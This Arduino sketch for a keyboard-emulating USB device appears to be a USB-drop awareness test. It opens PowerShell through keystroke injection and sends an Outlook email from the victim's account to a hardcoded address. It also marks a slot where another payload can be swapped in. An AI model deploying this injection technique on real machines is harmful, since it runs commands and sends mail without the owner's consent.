#include <Arduino.h>
#include <Keyboard.h>

// IF SOMEONE RE-USE THIS CODE : think on replacing this before anything else ^^'
#define ALERT_MAIL "\"ulysse31@gmail.com\""

void setup() {
  // Nothing to do here (at least for now ... ^^')
}

void loop()
{
  // some delay is needed just to be sure that usb keyboard to gets enabled on Operating system
  delay(1500);
  // Keyboard library start
  Keyboard.begin();
  // Launch an execute command window
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(10);
  Keyboard.releaseAll();
  delay(100);
  // type & launch powershell.exe
  Keyboard.print("powershell.exe");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(100);
  //
  // Powershell payload HERE: sample payload about works great on Microsoft Enabled O365 / Exchange Companies
  Keyboard.print("$Outlook = New-Object -ComObject Outlook.Application");
  delay(10);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(10);
  Keyboard.print("$Mail = $Outlook.CreateItem(0)");
  delay(10);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(10);
  Keyboard.print("$Mail.To = ");
  Keyboard.print(ALERT_MAIL);
  delay(10);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(10);
  Keyboard.print("$Mail.Subject = \"I'm a naughty person\"");
  delay(10);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(10);
  Keyboard.print("$Mail.Body =\"Sorry, I'm naughty I plugged in a unknown usb key\"");
  delay(10);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(10);
  Keyboard.print("$Mail.Send()");
  delay(10);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(10);
  // End Powershell payload
  //
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.end();
  delay(4000000000);
}